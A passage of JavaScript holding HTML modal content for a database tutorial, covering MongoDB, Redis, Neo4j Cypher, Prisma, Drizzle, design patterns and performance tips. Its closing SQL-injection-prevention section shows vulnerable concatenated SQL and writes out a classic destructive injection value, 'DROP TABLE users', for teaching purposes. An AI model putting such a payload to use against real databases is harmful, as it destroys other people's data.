    street: "123 Main",
    city: "Boston"
  },
  orders: [            // Embedded array
    { item: "Book", price: 20 },
    { item: "Laptop", price: 1000 }
  ]
}

// One query, no joins
db.users.findOne({ _id: "user123" })</code></pre>
                    </div>
                `
            },
            'db-mongo-scale': {
                title: 'Horizontal Scaling',
                body: `
                    <p>MongoDB has <strong>built-in sharding</strong> — distribute data across multiple servers automatically.</p>
                    <div class="modal-section">
                        <h4>How It Works</h4>
                        <ul>
                            <li>Choose a shard key (e.g., user_id)</li>
                            <li>MongoDB distributes documents across shards</li>
                            <li>Queries route to relevant shard(s)</li>
                            <li>Add more shards as data grows</li>
                        </ul>
                    </div>
                    <p>Companies like eBay and Adobe use MongoDB clusters with petabytes of data.</p>
                `
            },
            'db-mongo-caution': {
                title: 'MongoDB Limitations',
                body: `
                    <p>MongoDB trades some features for flexibility. Be aware of the tradeoffs.</p>
                    <div class="modal-section">
                        <h4>Watch Out For</h4>
                        <ul>
                            <li><strong>No joins</strong> — $lookup exists but is slow</li>
                            <li><strong>No multi-document ACID</strong> — (added in v4.0, but with caveats)</li>
                            <li><strong>Duplicate data</strong> — denormalization means data can drift</li>
                            <li><strong>Schema validation</strong> — optional, not enforced by default</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Rule of Thumb</h4>
                        <p>If you need lots of joins and strong consistency, relational is probably better. If your data is hierarchical and read-heavy, MongoDB shines.</p>
                    </div>
                `
            },

            // MongoDB Code
            'db-mongo-code': {
                title: 'MongoDB Node.js Driver',
                body: `
                    <p>Complete guide to using the official MongoDB driver.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Connection with options
const client = new MongoClient(uri, {
  maxPoolSize: 50,
  wtimeoutMS: 2500,
});

// Type-safe with TypeScript
interface User {
  _id: ObjectId;
  name: string;
  email: string;
}
const users = db.collection<User>('users');

// Bulk operations (much faster than individual inserts)
await users.bulkWrite([
  { insertOne: { document: { name: 'Alice' } } },
  { updateOne: { filter: { name: 'Bob' }, update: { $set: { active: true } } } },
  { deleteOne: { filter: { name: 'Carol' } } }
]);

// Change streams (real-time updates)
const changeStream = users.watch();
changeStream.on('change', (change) => {
  console.log('Document changed:', change);
});</code></pre>
                    </div>
                `
            },

            // Redis Data Types
            'db-redis-strings': {
                title: 'Redis Strings',
                body: `
                    <p>The simplest type — a key maps to a string value. But strings can be numbers, JSON, or binary data.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>SET user:1:name "Alice"
GET user:1:name  // "Alice"

// With expiration
SETEX session:abc 3600 "user_data"  // Expires in 1 hour

// Atomic increment (perfect for counters)
INCR page:home:views  // Returns new count
INCRBY user:1:points 10

// Set only if not exists (for locks)
SETNX lock:resource "owner:123"</code></pre>
                    </div>
                `
            },
            'db-redis-lists': {
                title: 'Redis Lists',
                body: `
                    <p>Ordered collections — perfect for queues, feeds, and recent items.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Add to list
LPUSH notifications:user1 "New message"
RPUSH queue:emails "job:123"

// Get range
LRANGE notifications:user1 0 9  // Last 10

// Pop from queue (blocking)
BLPOP queue:emails 30  // Wait up to 30 seconds

// Trim to keep only recent
LTRIM feed:user1 0 99  // Keep only 100 items</code></pre>
                    </div>
                `
            },
            'db-redis-sets': {
                title: 'Redis Sets',
                body: `
                    <p>Unordered unique values — great for tags, followers, and deduplication.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Add to set
SADD user:1:followers "user:2" "user:3"
SADD user:2:followers "user:1" "user:3"

// Check membership
SISMEMBER user:1:followers "user:2"  // 1 (true)

// Set operations
SINTER user:1:followers user:2:followers  // Common followers
SUNION user:1:followers user:2:followers  // All followers
SDIFF user:1:followers user:2:followers   // Only in first set

// Random member (for sampling)
SRANDMEMBER tags 5  // Get 5 random tags</code></pre>
                    </div>
                `
            },
            'db-redis-hashes': {
                title: 'Redis Hashes',
                body: `
                    <p>Field-value pairs — like objects. More memory efficient than separate keys.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Set fields
HSET user:1 name "Alice" email "alice@example.com" age 30

// Get single field
HGET user:1 name  // "Alice"

// Get all fields
HGETALL user:1  // {name: "Alice", email: "...", age: "30"}

// Increment field
HINCRBY user:1 age 1  // 31

// Check field exists
HEXISTS user:1 phone  // 0 (false)</code></pre>
                    </div>
                `
            },
            'db-redis-sorted': {
                title: 'Redis Sorted Sets',
                body: `
                    <p>Sets ordered by a score — perfect for leaderboards and priority queues.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Add with scores
ZADD leaderboard 100 "alice" 85 "bob" 92 "carol"

// Get by rank (highest first)
ZREVRANGE leaderboard 0 2 WITHSCORES
// [["alice", "100"], ["carol", "92"], ["bob", "85"]]

// Get rank of member
ZREVRANK leaderboard "carol"  // 1 (second place)

// Increment score
ZINCRBY leaderboard 20 "bob"  // bob now at 105

// Range by score
ZRANGEBYSCORE leaderboard 90 100  // Scores 90-100</code></pre>
                    </div>
                `
            },

            // Redis Code
            'db-redis-code': {
                title: 'ioredis Deep Dive',
                body: `
                    <p>ioredis is the recommended Redis client for Node.js — robust, feature-complete, and well-maintained.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>import Redis from 'ioredis';

// Cluster support
const cluster = new Redis.Cluster([
  { host: 'node1.redis', port: 6379 },
  { host: 'node2.redis', port: 6379 },
]);

// Pipelining (batch commands, single round trip)
const pipeline = redis.pipeline();
pipeline.set('key1', 'value1');
pipeline.get('key2');
pipeline.incr('counter');
const results = await pipeline.exec();

// Lua scripting (atomic operations)
const script = \`
  local current = redis.call('GET', KEYS[1])
  if current == ARGV[1] then
    return redis.call('SET', KEYS[1], ARGV[2])
  end
  return nil
\`;
await redis.eval(script, 1, 'mykey', 'expected', 'newvalue');</code></pre>
                    </div>
                `
            },

            // Redis Use Cases
            'db-redis-cache': {
                title: 'Redis as Cache',
                body: `
                    <p>The most common use — cache expensive database queries or API calls.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>async function getUser(id: number) {
  const cacheKey = \`user:\${id}\`;

  // Try cache first
  const cached = await redis.get(cacheKey);
  if (cached) return JSON.parse(cached);

  // Cache miss - fetch from database
  const user = await db.query('SELECT * FROM users WHERE id = $1', [id]);

  // Store in cache (expire in 1 hour)
  await redis.setex(cacheKey, 3600, JSON.stringify(user));

  return user;
}

// Invalidate on update
async function updateUser(id: number, data: any) {
  await db.query('UPDATE users SET ...', [data, id]);
  await redis.del(\`user:\${id}\`);  // Clear cache
}</code></pre>
                    </div>
                `
            },
            'db-redis-session': {
                title: 'Redis for Sessions',
                body: `
                    <p>Store user sessions in Redis for fast access and automatic expiration.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Store session on login
const sessionId = crypto.randomUUID();
await redis.setex(
  \`session:\${sessionId}\`,
  86400,  // 24 hours
  JSON.stringify({ userId: user.id, role: user.role })
);
res.cookie('session', sessionId, { httpOnly: true });

// Validate session on request
const sessionData = await redis.get(\`session:\${sessionId}\`);
if (!sessionData) throw new Error('Invalid session');
const session = JSON.parse(sessionData);

// Extend session on activity
await redis.expire(\`session:\${sessionId}\`, 86400);</code></pre>
                    </div>
                `
            },
            'db-redis-ratelimit': {
                title: 'Rate Limiting with Redis',
                body: `
                    <p>Prevent abuse by limiting requests per user/IP with sliding windows.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>async function rateLimit(userId: string, limit: number, windowSec: number) {
  const key = \`ratelimit:\${userId}\`;
  const current = await redis.incr(key);

  if (current === 1) {
    // First request - set expiration
    await redis.expire(key, windowSec);
  }

  if (current > limit) {
    const ttl = await redis.ttl(key);
    throw new Error(\`Rate limited. Retry in \${ttl}s\`);
  }

  return { remaining: limit - current };
}

// Usage: 100 requests per minute
await rateLimit(req.userId, 100, 60);</code></pre>
                    </div>
                `
            },
            'db-redis-realtime': {
                title: 'Real-time with Redis Pub/Sub',
                body: `
                    <p>Broadcast messages to multiple subscribers instantly.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Publisher (one Redis client)
const pub = new Redis();
await pub.publish('chat:room1', JSON.stringify({
  user: 'Alice',
  message: 'Hello everyone!'
}));

// Subscriber (separate client)
const sub = new Redis();
sub.subscribe('chat:room1');
sub.on('message', (channel, message) => {
  const data = JSON.parse(message);
  broadcastToWebSockets(channel, data);
});

// Multiple rooms
sub.psubscribe('chat:*');  // Pattern subscribe</code></pre>
                    </div>
                `
            },

            // Graph Use Cases
            'db-graph-social': {
                title: 'Social Networks',
                body: `
                    <p>Graph databases make social queries trivial that would be complex SQL.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// "Find friends of friends who I don't know yet"
// SQL: Multiple self-joins, complex and slow
// Cypher: Natural and fast

MATCH (me:User {name: 'Alice'})-[:FRIENDS]->(friend)
      -[:FRIENDS]->(foaf)
WHERE NOT (me)-[:FRIENDS]->(foaf)
  AND foaf <> me
RETURN DISTINCT foaf.name</code></pre>
                    </div>
                `
            },
            'db-graph-recommend': {
                title: 'Recommendation Engines',
                body: `
                    <p>"People who liked X also liked Y" is a graph traversal.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Find products often bought together
MATCH (p:Product {id: '123'})<-[:PURCHASED]-(user)
      -[:PURCHASED]->(other:Product)
WHERE other <> p
RETURN other.name, COUNT(*) as co_purchases
ORDER BY co_purchases DESC
LIMIT 5</code></pre>
                    </div>
                `
            },
            'db-graph-fraud': {
                title: 'Fraud Detection',
                body: `
                    <p>Fraudsters often share devices, addresses, or payment methods. Graphs reveal hidden connections.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Find accounts sharing suspicious patterns
MATCH (a:Account)-[:USED_DEVICE]->(d:Device)
      <-[:USED_DEVICE]-(b:Account)
WHERE a <> b
  AND (a)-[:USED_IP]->()<-[:USED_IP]-(b)
RETURN a, b, d</code></pre>
                    </div>
                `
            },
            'db-graph-knowledge': {
                title: 'Knowledge Graphs',
                body: `
                    <p>Model complex domains with entities and relationships — like Wikipedia's structure.</p>
                    <div class="modal-section">
                        <h4>Example: Medical Knowledge</h4>
                        <ul>
                            <li>(Drug)-[:TREATS]->(Disease)</li>
                            <li>(Drug)-[:INTERACTS_WITH]->(Drug)</li>
                            <li>(Symptom)-[:INDICATES]->(Disease)</li>
                            <li>(Gene)-[:ASSOCIATED_WITH]->(Disease)</li>
                        </ul>
                    </div>
                `
            },

            // Cypher Examples
            'db-cypher-examples': {
                title: 'Cypher Query Language',
                body: `
                    <p>Cypher is a declarative graph query language — patterns look like ASCII art.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Pattern syntax
(node)                    // A node
(node:Label)              // Node with label
(node {prop: 'value'})    // Node with property
-[relationship]->         // Directed relationship
-[r:TYPE]->               // Relationship with type
-[*1..3]->                // Variable length (1-3 hops)

// Create pattern
CREATE (a:Person {name: 'Alice'})-[:KNOWS]->(b:Person {name: 'Bob'})

// Match pattern
MATCH (a)-[:KNOWS*1..3]->(b)  // Friends up to 3 degrees
RETURN a, b

// Update
MATCH (a:Person {name: 'Alice'})
SET a.verified = true

// Delete
MATCH (a:Person {name: 'Alice'})-[r:KNOWS]->(b)
DELETE r</code></pre>
                    </div>
                `
            },

            // ORM Benefits
            'db-orm-typesafe': {
                title: 'Type-Safe Database Access',
                body: `
                    <p>With TypeScript ORMs, database errors become <strong>compile-time errors</strong>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Without ORM (type unsafe)
const result = await db.query('SELECT * FROM users WHERE id = $1', [id]);
result.rows[0].nmae  // Typo! Runtime error

// With Prisma (type safe)
const user = await prisma.user.findUnique({ where: { id } });
user.nmae  // Compile error: Property 'nmae' does not exist

// Autocomplete works!
user.  // Shows: id, name, email, posts, profile...</code></pre>
                    </div>
                `
            },
            'db-orm-productive': {
                title: 'Developer Productivity',
                body: `
                    <p>ORMs reduce boilerplate and let you work with familiar objects.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Raw SQL (verbose)
const result = await db.query(\`
  INSERT INTO users (name, email, created_at)
  VALUES ($1, $2, NOW())
  RETURNING *
\`, [name, email]);
const user = result.rows[0];

// Prisma (concise)
const user = await prisma.user.create({
  data: { name, email }
});

// The ORM handles:
// - SQL generation
// - Parameter escaping
// - Type conversion
// - Default values</code></pre>
                    </div>
                `
            },
            'db-orm-portable': {
                title: 'Database Portability',
                body: `
                    <p>Switch databases without rewriting queries — the ORM abstracts differences.</p>
                    <div class="modal-section">
                        <h4>Same Code, Different Databases</h4>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>// schema.prisma
datasource db {
  provider = "postgresql"  // Change to "mysql" or "sqlite"
  url      = env("DATABASE_URL")
}

// Your code stays the same
const users = await prisma.user.findMany({
  where: { active: true }
});

// ORM generates correct SQL for each database</code></pre>
                        </div>
                    </div>
                `
            },
            'db-orm-leaky': {
                title: 'ORMs Are Leaky Abstractions',
                body: `
                    <p>ORMs hide SQL, but you still need to understand what's happening underneath.</p>
                    <div class="modal-section">
                        <h4>Common Gotchas</h4>
                        <ul>
                            <li><strong>N+1 queries</strong> — ORM may fetch related data in loops</li>
                            <li><strong>Inefficient queries</strong> — generated SQL isn't always optimal</li>
                            <li><strong>Missing indexes</strong> — ORM can't tell you what to index</li>
                            <li><strong>Complex queries</strong> — sometimes raw SQL is clearer</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Best Practice</h4>
                        <p>Learn SQL first. Use an ORM for productivity. Drop to raw SQL when needed. Always check the generated queries in development.</p>
                    </div>
                `
            },

            // Prisma Features
            'db-prisma-schema': {
                title: 'Prisma Schema Language',
                body: `
                    <p>A declarative schema that defines your models, relationships, and database config.</p>
                    <div class="modal-section">
                        <h4>Key Features</h4>
                        <ul>
                            <li><strong>@id</strong> — primary key</li>
                            <li><strong>@unique</strong> — unique constraint</li>
                            <li><strong>@default()</strong> — default values</li>
                            <li><strong>@relation</strong> — define relationships</li>
                            <li><strong>@map</strong> — custom column names</li>
                        </ul>
                    </div>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>model Post {
  id        Int      @id @default(autoincrement())
  slug      String   @unique
  title     String   @db.VarChar(200)
  content   String?
  published Boolean  @default(false)
  author    User     @relation(fields: [authorId], references: [id])
  authorId  Int      @map("author_id")
  tags      Tag[]    // Many-to-many
  createdAt DateTime @default(now()) @map("created_at")

  @@index([authorId])
  @@map("posts")
}</code></pre>
                    </div>
                `
            },
            'db-prisma-typesafe': {
                title: 'Prisma Type Generation',
                body: `
                    <p>Prisma generates TypeScript types from your schema — zero manual type definitions.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Generated automatically from schema
type User = {
  id: number;
  email: string;
  name: string | null;
  posts: Post[];
  profile: Profile | null;
  createdAt: Date;
}

// IntelliSense knows everything
const user = await prisma.user.findUnique({
  where: { email: 'alice@example.com' },
  include: { posts: true }
});

user.posts[0].title  // TypeScript knows this exists</code></pre>
                    </div>
                `
            },
            'db-prisma-migrations': {
                title: 'Prisma Migrations',
                body: `
                    <p>Schema changes generate SQL migrations automatically.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code># Development: create and apply migration
npx prisma migrate dev --name add_user_role

# Generates:
# migrations/20240115_add_user_role/migration.sql
ALTER TABLE "users" ADD COLUMN "role" VARCHAR(50);

# Production: apply pending migrations
npx prisma migrate deploy

# View migration status
npx prisma migrate status</code></pre>
                    </div>
                `
            },
            'db-prisma-studio': {
                title: 'Prisma Studio',
                body: `
                    <p>A visual database browser that runs locally.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code># Launch studio
npx prisma studio

# Opens browser at http://localhost:5555
# - Browse all tables
# - View and edit records
# - Filter and sort data
# - See relationships visually</code></pre>
                    </div>
                `
            },
            'db-prisma-performance': {
                title: 'Prisma Query Engine',
                body: `
                    <p>Prisma uses a Rust query engine for optimal performance.</p>
                    <div class="modal-section">
                        <h4>How It Works</h4>
                        <ul>
                            <li>Query engine runs as a separate process</li>
                            <li>Compiles queries to optimized SQL</li>
                            <li>Connection pooling built-in</li>
                            <li>Query batching and caching</li>
                        </ul>
                    </div>
                `
            },

            // Prisma Queries
            'db-prisma-queries': {
                title: 'Prisma Query API',
                body: `
                    <p>Comprehensive query API with full TypeScript support.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Find operations
await prisma.user.findUnique({ where: { id: 1 } });
await prisma.user.findFirst({ where: { name: { contains: 'A' } } });
await prisma.user.findMany({ take: 10, skip: 20 });

// Create operations
await prisma.user.create({ data: { name: 'Alice', email: '...' } });
await prisma.user.createMany({ data: [...], skipDuplicates: true });

// Update operations
await prisma.user.update({ where: { id: 1 }, data: { name: 'Bob' } });
await prisma.user.updateMany({ where: { role: null }, data: { role: 'user' } });
await prisma.user.upsert({
  where: { email: 'alice@example.com' },
  create: { email: '...', name: 'Alice' },
  update: { name: 'Alice' }
});

// Delete operations
await prisma.user.delete({ where: { id: 1 } });
await prisma.user.deleteMany({ where: { lastLogin: { lt: oldDate } } });

// Aggregations
await prisma.user.count({ where: { active: true } });
await prisma.order.aggregate({ _sum: { total: true }, _avg: { total: true } });</code></pre>
                    </div>
                `
            },

            // Drizzle
            'db-drizzle-schema': {
                title: 'Drizzle Schema Definition',
                body: `
                    <p>Define schemas in TypeScript — no separate schema language.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>import { pgTable, serial, text, timestamp,
         integer, boolean, pgEnum } from 'drizzle-orm/pg-core';
import { relations } from 'drizzle-orm';

export const roleEnum = pgEnum('role', ['user', 'admin']);

export const users = pgTable('users', {
  id: serial('id').primaryKey(),
  name: text('name').notNull(),
  email: text('email').unique().notNull(),
  role: roleEnum('role').default('user'),
  createdAt: timestamp('created_at').defaultNow()
});

export const posts = pgTable('posts', {
  id: serial('id').primaryKey(),
  title: text('title').notNull(),
  authorId: integer('author_id').references(() => users.id)
});

// Define relations separately
export const usersRelations = relations(users, ({ many }) => ({
  posts: many(posts)
}));</code></pre>
                    </div>
                `
            },
            'db-drizzle-queries': {
                title: 'Drizzle Query API',
                body: `
                    <p>SQL-like syntax that feels natural to SQL developers.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>import { eq, gt, and, desc, sql } from 'drizzle-orm';

// Select with where
const activeUsers = await db
  .select()
  .from(users)
  .where(eq(users.role, 'admin'));

// Join
const usersWithPosts = await db
  .select({
    userName: users.name,
    postTitle: posts.title
  })
  .from(users)
  .leftJoin(posts, eq(users.id, posts.authorId));

// Insert
await db.insert(users).values({ name: 'Alice', email: '...' });

// Update
await db.update(users)
  .set({ role: 'admin' })
  .where(eq(users.id, 1));

// Raw SQL when needed
const result = await db.execute(sql\`
  SELECT * FROM users WHERE email LIKE \${pattern}
\`);</code></pre>
                    </div>
                `
            },

            // Decision Guide
            'db-decision-acid': {
                title: 'Need ACID Transactions',
                body: `
                    <p>When data integrity and transactions are critical.</p>
                    <div class="modal-section">
                        <h4>Choose: PostgreSQL or MySQL</h4>
                        <ul>
                            <li>Financial applications</li>
                            <li>E-commerce (orders, payments)</li>
                            <li>Healthcare records</li>
                            <li>Booking systems</li>
                        </ul>
                    </div>
                    <p><strong>PostgreSQL</strong> is the default choice for new projects. Use MySQL if your team has expertise or you're integrating with existing systems.</p>
                `
            },
            'db-decision-speed': {
                title: 'Need Sub-Millisecond Latency',
                body: `
                    <p>When every microsecond counts.</p>
                    <div class="modal-section">
                        <h4>Choose: Redis</h4>
                        <ul>
                            <li>Caching layer</li>
                            <li>Session storage</li>
                            <li>Real-time leaderboards</li>
                            <li>Rate limiting</li>
                        </ul>
                    </div>
                    <p>Redis serves data from memory — 100K+ ops/second with &lt;1ms latency. Use alongside your primary database, not instead of it.</p>
                `
            },
            'db-decision-flexible': {
                title: 'Need Flexible Schema',
                body: `
                    <p>When your data structure evolves frequently or varies per record.</p>
                    <div class="modal-section">
                        <h4>Choose: MongoDB</h4>
                        <ul>
                            <li>Content management</li>
                            <li>Product catalogs with varying attributes</li>
                            <li>User-generated content</li>
                            <li>Rapid prototyping</li>
                        </ul>
                    </div>
                    <p>But consider: PostgreSQL JSONB gives you flexible schema WITH relational features when you need them.</p>
                `
            },
            'db-decision-relations': {
                title: 'Complex Relationships',
                body: `
                    <p>When relationships ARE the data, not just connections between data.</p>
                    <div class="modal-section">
                        <h4>Choose: Neo4j</h4>
                        <ul>
                            <li>Social networks</li>
                            <li>Recommendation engines</li>
                            <li>Fraud detection</li>
                            <li>Knowledge graphs</li>
                        </ul>
                    </div>
                    <p>If you're doing lots of "friends of friends" or "shortest path" queries, graph databases are 100-1000x faster than relational.</p>
                `
            },
            'db-decision-timeseries': {
                title: 'Time-Series Data',
                body: `
                    <p>When most queries are time-based and data arrives continuously.</p>
                    <div class="modal-section">
                        <h4>Choose: TimescaleDB or InfluxDB</h4>
                        <ul>
                            <li>Application metrics</li>
                            <li>IoT sensor data</li>
                            <li>Financial tick data</li>
                            <li>Log analytics</li>
                        </ul>
                    </div>
                    <p><strong>TimescaleDB</strong> is a PostgreSQL extension — get time-series performance with SQL familiarity.</p>
                `
            },
            'db-decision-search': {
                title: 'Full-Text Search',
                body: `
                    <p>When users need to search through text content with relevance ranking.</p>
                    <div class="modal-section">
                        <h4>Choose: Elasticsearch or Meilisearch</h4>
                        <ul>
                            <li>Product search</li>
                            <li>Document search</li>
                            <li>Autocomplete</li>
                            <li>Log analysis</li>
                        </ul>
                    </div>
                    <p><strong>Meilisearch</strong> is simpler to run. <strong>Elasticsearch</strong> is more powerful but complex. For basic search, PostgreSQL full-text search might be enough.</p>
                `
            },

            // Polyglot Persistence
            'db-poly-postgres': {
                title: 'PostgreSQL as Primary',
                body: `
                    <p>Your source of truth for transactional data.</p>
                    <div class="modal-section">
                        <h4>Store Here</h4>
                        <ul>
                            <li>User accounts and authentication</li>
                            <li>Orders and payments</li>
                            <li>Inventory and products</li>
                            <li>Any data requiring ACID</li>
                        </ul>
                    </div>
                `
            },
            'db-poly-redis': {
                title: 'Redis as Accelerator',
                body: `
                    <p>Speed up reads and enable real-time features.</p>
                    <div class="modal-section">
                        <h4>Store Here</h4>
                        <ul>
                            <li>Cache of frequently accessed data</li>
                            <li>User sessions</li>
                            <li>Rate limiting counters</li>
                            <li>Real-time notifications</li>
                        </ul>
                    </div>
                `
            },
            'db-poly-elastic': {
                title: 'Elasticsearch for Search',
                body: `
                    <p>Index searchable content from your primary database.</p>
                    <div class="modal-section">
                        <h4>Store Here</h4>
                        <ul>
                            <li>Product search index</li>
                            <li>Application logs</li>
                            <li>Full-text content search</li>
                            <li>Analytics data</li>
                        </ul>
                    </div>
                `
            },
            'db-poly-s3': {
                title: 'Object Storage for Files',
                body: `
                    <p>Don't store large binary files in your database.</p>
                    <div class="modal-section">
                        <h4>Store Here</h4>
                        <ul>
                            <li>User uploads (images, documents)</li>
                            <li>Database backups</li>
                            <li>Static assets</li>
                            <li>Large data exports</li>
                        </ul>
                    </div>
                    <p>Store the URL/key in your database, the file in S3/R2/GCS.</p>
                `
            },

            // Database Patterns
            'db-pattern-cache': {
                title: 'Cache-Aside Pattern',
                body: `
                    <p>Application manages cache. Check cache first, fall back to database.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>async function getData(key: string) {
  // 1. Try cache
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);

  // 2. Cache miss - query database
  const data = await db.query('SELECT ...');

  // 3. Populate cache
  await redis.setex(key, 3600, JSON.stringify(data));

  return data;
}

// On data change - invalidate cache
await db.query('UPDATE ...');
await redis.del(key);</code></pre>
                    </div>
                `
            },
            'db-pattern-cqrs': {
                title: 'CQRS Pattern',
                body: `
                    <p>Command Query Responsibility Segregation — separate read and write models.</p>
                    <div class="modal-section">
                        <h4>How It Works</h4>
                        <ul>
                            <li><strong>Commands (writes)</strong> → Normalized database</li>
                            <li><strong>Queries (reads)</strong> → Denormalized read model</li>
                            <li>Sync via events or change data capture</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Benefits</h4>
                        <ul>
                            <li>Optimize reads and writes independently</li>
                            <li>Scale read replicas separately</li>
                            <li>Different storage for different access patterns</li>
                        </ul>
                    </div>
                `
            },
            'db-pattern-saga': {
                title: 'Saga Pattern',
                body: `
                    <p>Manage distributed transactions across services with compensating actions.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Order saga: Order → Payment → Inventory → Shipping
async function createOrderSaga(order) {
  try {
    const orderId = await orderService.create(order);
    const paymentId = await paymentService.charge(order.total);
    await inventoryService.reserve(order.items);
    await shippingService.schedule(orderId);

  } catch (error) {
    // Compensating transactions (undo in reverse)
    await shippingService.cancel(orderId);
    await inventoryService.release(order.items);
    await paymentService.refund(paymentId);
    await orderService.cancel(orderId);
    throw error;
  }
}</code></pre>
                    </div>
                `
            },
            'db-pattern-eventstore': {
                title: 'Event Sourcing',
                body: `
                    <p>Store events, not current state. Rebuild state by replaying events.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Instead of: UPDATE accounts SET balance = 150
// Store events:
{ type: 'AccountCreated', data: { balance: 0 } }
{ type: 'MoneyDeposited', data: { amount: 200 } }
{ type: 'MoneyWithdrawn', data: { amount: 50 } }
// Current state: balance = 150

// Benefits:
// - Complete audit trail
// - Time travel (what was balance on Jan 1?)
// - Debug by replaying events
// - Rebuild read models from scratch</code></pre>
                    </div>
                `
            },

            // Performance Tips
            'db-tip-index': {
                title: 'Index Strategy',
                body: `
                    <p>Indexes speed up queries but slow down writes. Index strategically.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- Index columns used in:
-- WHERE clauses
CREATE INDEX idx_users_email ON users(email);

-- JOIN conditions
CREATE INDEX idx_posts_author ON posts(author_id);

-- ORDER BY clauses
CREATE INDEX idx_posts_created ON posts(created_at DESC);

-- Composite index (order matters!)
CREATE INDEX idx_orders_user_date ON orders(user_id, created_at);
-- Good for: WHERE user_id = 1 AND created_at > '2024-01-01'
-- Also good for: WHERE user_id = 1 (uses prefix)
-- NOT good for: WHERE created_at > '2024-01-01' (can't use)</code></pre>
                    </div>
                `
            },
            'db-tip-explain': {
                title: 'EXPLAIN ANALYZE',
                body: `
                    <p>See exactly how the database executes your query.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>EXPLAIN ANALYZE
SELECT * FROM orders WHERE user_id = 1 AND status = 'pending';

-- Output shows:
-- - Seq Scan vs Index Scan
-- - Estimated vs actual rows
-- - Time per step
-- - Memory usage

-- Bad: Seq Scan on orders (cost=0.00..1000.00)
-- Good: Index Scan using idx_orders_user (cost=0.00..8.27)

-- Prisma: Enable query logging
const prisma = new PrismaClient({ log: ['query'] });</code></pre>
                    </div>
                `
            },
            'db-tip-n1': {
                title: 'N+1 Query Problem',
                body: `
                    <p>Fetching related data in a loop causes N+1 queries. Use eager loading.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// BAD: N+1 queries
const users = await prisma.user.findMany();
for (const user of users) {
  const posts = await prisma.post.findMany({
    where: { authorId: user.id }  // Query per user!
  });
}
// 1 query for users + N queries for posts = N+1

// GOOD: Single query with include
const users = await prisma.user.findMany({
  include: { posts: true }  // JOIN in single query
});
// 1 query total (or 2 with batched loading)</code></pre>
                    </div>
                `
            },
            'db-tip-pool': {
                title: 'Connection Pooling',
                body: `
                    <p>Database connections are expensive. Reuse them via pooling.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// BAD: New connection per request
app.get('/users', async (req, res) => {
  const client = new Client(connectionString);
  await client.connect();  // Slow!
  const result = await client.query('SELECT ...');
  await client.end();
});

// GOOD: Connection pool
const pool = new Pool({
  connectionString,
  max: 20,  // Max connections in pool
  idleTimeoutMillis: 30000
});

app.get('/users', async (req, res) => {
  const result = await pool.query('SELECT ...');
  // Connection returned to pool automatically
});</code></pre>
                    </div>
                `
            },
            'db-tip-pagination': {
                title: 'Pagination Strategies',
                body: `
                    <p>Never fetch unlimited results. Paginate large datasets.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Offset pagination (simple but slow for deep pages)
SELECT * FROM posts ORDER BY id LIMIT 20 OFFSET 1000;
-- Problem: DB must scan 1020 rows to return 20

// Cursor pagination (consistent and fast)
SELECT * FROM posts
WHERE id > :last_seen_id  -- Start after cursor
ORDER BY id
LIMIT 20;

// With Prisma
const posts = await prisma.post.findMany({
  take: 20,
  skip: 1,  // Skip the cursor
  cursor: { id: lastPostId },
  orderBy: { id: 'asc' }
});</code></pre>
                    </div>
                `
            },
            'db-tip-denormalize': {
                title: 'Strategic Denormalization',
                body: `
                    <p>Sometimes duplicating data is better than complex joins.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Normalized (requires JOIN)
orders: { id, user_id, ... }
users: { id, name, ... }

SELECT o.*, u.name
FROM orders o JOIN users u ON o.user_id = u.id;

// Denormalized (no join needed)
orders: { id, user_id, user_name, ... }

SELECT * FROM orders WHERE id = 1;

// Trade-offs:
// + Faster reads (no join)
// - More storage
// - Must update both places
// - Risk of data drift

// Use when:
// - Read-heavy workload
// - Data rarely changes
// - Join is expensive (cross-service)</code></pre>
                    </div>
                `
            },

            // Security
            'db-sec-injection': {
                title: 'SQL Injection Prevention',
                body: `
                    <p>The #1 database security rule: <strong>NEVER</strong> concatenate user input into SQL.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// VULNERABLE — attacker can inject SQL
const query = \`SELECT * FROM users WHERE email = '\${email}'\`;
// If email = "'; DROP TABLE users; --"
// Query becomes: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'

// SAFE — parameterized query
const query = 'SELECT * FROM users WHERE email = $1';
